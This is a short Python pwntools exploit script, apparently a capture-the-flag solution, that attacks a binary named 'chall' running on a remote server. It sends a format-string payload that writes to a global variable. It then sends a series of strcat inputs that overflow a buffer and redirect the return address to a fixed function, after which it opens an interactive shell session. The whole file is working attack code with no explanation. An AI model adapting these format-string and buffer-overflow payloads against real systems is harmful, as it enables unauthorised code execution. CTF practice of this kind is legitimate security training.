#!/usr/bin/python3


from pwn import *

context.binary = exe = ELF('./chall',checksec=False)

#p = process()
p = remote('61.14.233.78',1400)
#gdb.attach(p,gdbscript='''
#        b*0x0000000000401468
#        b*0x000000000040141a
#        b*0x0000000000401443
#        b*0x0000000000401494
#           ''')

change = 0x00000000004041C0

def strcpy(data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'data: ',data)

def strcat(data):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'data: ',data)
def printf_():
    p.sendlineafter(b'> ',b'3')
payload = b'%4919c%8$hn' 
payload = payload.ljust(15,b'a')
payload += p64(change)
strcpy(payload)
printf_()
strcpy(b'a'*255)
strcat(b'z'*16 + p64(0xdeadbeefcafebabe) + p64(0xcafe401256))
strcat(b'k'*3 + p64(0xdeadbeefcafebabe) + p64(0xfe401256))
input()
strcat(b'v'*3 + p64(0xdeadbeefcafebabe) + p64(0x401256))


p.interactive()
